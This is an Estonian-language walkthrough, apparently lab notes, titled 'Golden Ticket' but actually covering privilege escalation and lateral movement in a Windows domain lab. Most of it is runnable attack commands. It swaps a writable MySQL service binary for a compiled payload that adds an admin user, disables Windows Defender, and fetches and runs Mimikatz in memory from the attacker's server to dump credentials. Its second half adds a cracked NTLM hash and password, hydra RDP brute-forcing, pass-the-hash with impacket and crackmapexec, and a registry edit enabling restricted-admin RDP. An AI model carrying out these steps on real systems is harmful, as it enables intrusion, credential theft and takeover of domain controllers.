# Golden Ticket Rünnakujuhend

See dokument kirjeldab "Golden Ticket" tüüpi rünnaku stsenaariumit, mis kasutab ära valesti konfigureeritud teenuse õigusi, et saavutada süsteemis kõrgemad privileegid.

## Eeltingimused ja Keskkond

-   **Ründaja masin (Kali):** `192.168.1.101`
-   **Domeenikontroller (DC01):** `192.168.1.2` (Domeen: `contoso.com`)
-   **Sihtmärkserver (server1):** `192.168.1.17`
-   **Kompromiteeritud kasutaja:**
    -   Kasutajanimi: `henry`
    -   Parool: `V4hetaM1nd.`

---

## Rünnaku Sammud

### 1. Võrgu skaneerimine ja sihtmärgi tuvastamine

Alustame Kali masinas võrgu skaneerimisega, et tuvastada aktiivsed seadmed ja nende teenused.

```bash
# Veendu, et oled õiges võrgus
ip a

# Skaneeri /24 võrku, et leida seadmeid, nende operatsioonisüsteeme (-O) ja teenuste versioone (-sV)
sudo nmap -sV -O 192.168.1.0/24
```

**Tulemused:**
*   `192.168.1.2`: Tuvastatud kui `DC01` domeenis `contoso.com`.
*   `192.168.1.17`: Tuvastatud avatud pordiga `3389/tcp` (RDP).

### 2. Sisselogimine kompromiteeritud kontoga

Kasutame lekkinud `henry` kontot, et ühenduda sihtmärkserveriga (`192.168.1.17`) RDP kaudu.

```bash
sudo xfreerdp3 /u:henry /p:'V4hetaM1nd.' /d:contoso /v:192.168.1.17
```

Pärast ühendumist ava serveris PowerShell ja kontrolli kasutaja õigusi.

```powershell
whoami /groups
```

### 3. Teenuste uurimine

Otsime sihtmärkserveris jooksvaid teenuseid, et leida potentsiaalseid rünnak vektoreid.

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName,StartName | Where-Object State -like "Running"
```

Märkame jooksvat `MySQL` teenust. Kontrollime selle käivitatava faili (`mysqld.exe`) õigusi.

```powershell
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

**Tulemus:**
*   `BUILTIN\Users:(F)` - See tähendab, et kõik kasutajad (sh meie `henry` kasutaja) omavad sellele failile täielikke (Full access) õigusi.

Kontrollime ka, kas teenus käivitub automaatselt.

```powershell
Get-CimInstance -ClassName Win32_Service -Filter "Name='mysql'" | Select-Object Startmode
```

**Tulemus:**
*   `Startmode: Auto` - See on ideaalne, kuna see tähendab, et meie pahatahtlik kood käivitatakse automaatselt pärast süsteemi taaskäivitamist.

### 4. Pahavara loomine (Admin-kasutaja lisamine)

Loome Kali masinas C-keeles lihtsa programmi, mis lisab süsteemi uue lokaalse administraatori nimega `pentest` ja parooliga `kalasaba1.`.

```bash
# Loo uus kaust ja sisene sinna
mkdir pentest
cd pentest

# Loo C-fail
nano adduser.c
```

Kopeeri faili `adduser.c` järgnev sisu:
```c
#include <stdlib.h>

int main() {
    // Lisa uus kasutaja "pentest" parooliga "kalasaba1."
    system("net user pentest kalasaba1. /add");
    // Lisa loodud kasutaja lokaalsete administraatorite gruppi
    system("net localgroup administrators pentest /add");
    return 0;
}
```

Kompileerime C-koodi Windowsi `.exe` failiks.

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

### 5. Pahavara serveerimine ja allalaadimine

Käivitame `pentest` kaustas Pythoni veebiserveri, et saaksime `adduser.exe` faili sihtmärkserverisse laadida.

```bash
# Käivita veebiserver pordil 80
python3 -m http.server 80
```

Nüüd lae sihtmärkserveri (RDP sessiooni) PowerShellis fail alla:

```powershell
# Lae fail alla Kali masinast (192.168.1.101)
iwr -Uri http://192.168.1.101/adduser.exe -OutFile adduser.exe
```

### 6. Teenuse faili asendamine

Sihtmärkserveri PowerShellis asendame nüüd originaalse `mysqld.exe` faili meie loodud `adduser.exe`-ga.

```powershell
# Tee originaalfailist varukoopia
move C:\xampp\mysql\bin\mysqld.exe C:\xampp\mysql\bin\oldmysqld.exe

# Asenda originaal meie failiga
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```

Nüüd teeme serverile restardi. Pärast restarti käivitab MySQL teenus meie `adduser.exe` faili ja loob uue admin-kasutaja.

```powershell
Restart-Computer
```

### 7. Sisselogimine uue admin-kontoga

Pärast serveri taaskäivitumist saame sisse logida uue, äsja loodud `pentest` kontoga. See konto on lokaalne, seega domeeni (`/d:contoso`) pole vaja määrata.

```bash
sudo xfreerdp3 /u:pentest /p:'kalasaba1.' /v:192.168.1.17
```

**Õnnitleme! Oled nüüd serveris lokaalse administraatori õigustes.**

### 8. Järeltegevus: Mimikatz

Administraatori õigustes saame proovida mälust paroole ja räsisid kätte saada, kasutades **Mimikatz**.

Esmalt, lae Mimikatz alla. Selleks võib kasutada näiteks [Invoke-Mimikatz](https://github.com/leppalintu/invoke_mimikaz) repositooriumit. Lae failid oma Kali masina `pentest` kausta, kus jookseb veebiserver.

Seejärel, sihtmärkserveri uues admin-sessioonis (juba `pentest` kasutajana), keela ajutiselt Windows Defender.

```powershell
# Keela reaalajas monitooring (nõuab admin õigusi)
Set-MpPreference -DisableRealtimeMonitoring $true
```

Lae Mimikatz alla ja käivita see mälus, et vältida kettale kirjutamist.

```powershell
# Lae ja käivita Invoke-Mimikatz skript
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.101/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds
```
Alternatiivselt, kui laadisid alla `.exe` faili, saad selle käivitada. Enne seda tõsta oma protsessi õigusi:

```powershell
privilege::debug
```
See annab vajalikud õigused, et teiste protsesside mälu lugeda.


*****************
Jätkub 2.päev:
*****************
Eesmärk on leida CONTOSO domeeni Administrator kasutaja LTMN võtit!
********************************************************************
***************** c625e3e2756d9ef01881fa7ed46b49a8 *****************
********************************************************************
***** CrackStation.net **** sai sellest hash käsust jagu ***********
************************** NTLM *********** stars4191* *************
********************************************************************
********* aga se oli praegu vale tee.. peab ootama programmi *******
********************************************************************
KALI masinas

veendume, et meil on Dokumentides rockyou.txt fail nii zip kui ka lahti pakitud, sest mõni programm vajab ka zipi..

seejärel teises terminalis:

hydra -V -f -l Administrator -P /home/heiki/Documents/rockyou.txt rdp://192.168.1.2

uus terminal:
/usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2

hostname
whoami
whoami /groups
ctrl+c -väljume sellest

crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d x0x /f'

kontrollime seda kas se ka tegelikult läbi läks, ehk siis kustutame sellest eelnevast sisestusest mõned kohad ja muudame *add* *query'ks*

crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg query HKLM\System\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin'

sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /d:contoso /pth:c625e3e2756d9ef01881fa7ed46b49a8 /restricted-admin
küsib meie parooli ja voilaa siseneb serverisse

Nüüd peab hakkama veenduma mis siin sees on.. grupipoliitikaid, milliseid kasutajaid näeme, kus näeme neid kasutajaid mis on peidul silma alt..
Active Directory Administrative Center alt leiab lõpuks ka kerberose kasutaja, mida muidu ei leia






